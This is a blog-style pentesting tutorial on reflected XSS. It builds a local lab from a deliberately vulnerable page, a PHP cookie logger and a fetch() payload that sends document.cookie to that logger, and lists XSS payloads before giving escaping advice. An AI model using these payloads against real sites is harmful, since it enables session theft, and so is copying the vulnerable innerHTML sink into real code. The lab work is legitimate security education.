---
title: "Reflected XSS: Explained with Real Examples"
author: saramazal
layout: post
date: 2025-04-17
categories: [XSS]
tags: [xss, web, pentesting, tryhackme, client-side, appsec]
img_path: /images/covers
image:
  path: /images/covers/pink-girl5.jpg
---

## 👾 Reflected XSS – Real-World Lab

Let’s dive into Reflected Cross-Site Scripting (XSS), a client-side vulnerability used by attackers to execute malicious code in a victim’s browser. This lab simulates real scenarios, built for hands-on learning.

---

## 🚨 What is Reflected XSS?

Reflected XSS happens when data from a request (URL, form, etc.) is immediately echoed in the response without validation or sanitization.

🛠️ **Example:**
```html
http://victim-site.com/page?q=<script>alert(1)</script>
```

If the app outputs `q` without filtering, the script runs in the browser.

---

## 🎯 Lab Goals

- See how user input reflects in HTML
- Inject XSS payloads manually
- Steal cookies with `fetch()` to a PHP logger
- Confirm captured cookies in terminal

---

## 🧱 Lab Structure

```
xss-lab/
├── xss-lab.html        # The vulnerable page
├── steal.php           # Attacker's logger
├── requests.log        # Log of stolen cookies
├── cookie.txt          # Simulated browser cookie file
```

---

## 🧠 Lab Code

### xss-lab.html

```html
<!DOCTYPE html>
<html>
<head><title>XSS Lab</title></head>
<body>
  <h2>Reflected XSS Demo</h2>
  <div id="output"></div>

  <script>
    const q = new URLSearchParams(location.search).get('q');
    document.getElementById('output').innerHTML = q;
  </script>
</body>
</html>
```

### steal.php

```php
<?php
file_put_contents("requests.log", print_r($_GET, true) . "\n", FILE_APPEND);
?>
```

---

## 🚀 Run the Lab Locally

1. **Start a local PHP server**:
```bash
php -S localhost:8080
```

2. **Set a fake cookie in your browser (DevTools Console):**
```js
document.cookie = "session_id=hello_mazal";
```

3. **Trigger the attack:**
```
http://localhost:8080/xss-lab.html?q=<script>fetch('http://localhost:8080/steal.php?c='+document.cookie)</script>
```

4. **Check logs:**
```bash
cat requests.log
```

---

## 💡 Test Inputs to Play With

Add these for form-based XSS:

```html
<input type="text" placeholder="Search...">
<textarea placeholder="Write a comment..."></textarea>
<input type="file" accept="image/*">
```

---

## ⚔️ Payload Examples

- Classic alert box:
```html
<script>alert("XSS")</script>
```

- Cookie theft:
```html
<script>fetch('http://localhost:8080/steal.php?c=' + document.cookie)</script>
```

- Image-based execution:
```html
<img src=x onerror="alert('XSS')">
```

- On-hover trigger:
```html
<b onmouseover="alert('XSS')">Hover me</b>
```

- Script via eval (dangerous if used):
```html
"><script>eval('alert(1)')</script>
```

---

## 🧪 Testing Tips

✅ Test in the browser by entering payloads in the URL:  
`http://localhost:8080/xss-lab.html?q=<script>alert(1)</script>`

✅ Or manually trigger fetch from DevTools:
```js
fetch("http://localhost:8080/steal.php?c=" + document.cookie)
```

---

## 🔒 Validating & Sanitizing Inputs

- **Validate** input against expected patterns (e.g., regex for email)
- **Sanitize** output by escaping characters like `<`, `>`, `"`, `'`

**Example (PHP):**
```php
echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
```

---

## 🔚 Final Thoughts

Reflected XSS is fast and dangerous. In real-world bug bounties, it’s still common due to poor input handling.

✅ Always sanitize before rendering  
✅ Test every input and reflected output  
✅ Use browser DevTools and manual payloads for testing

---

Stay curious, break safely, and document everything.  
**~ Maz4l 🤺**

---
*More hacks, more notes, more wins.*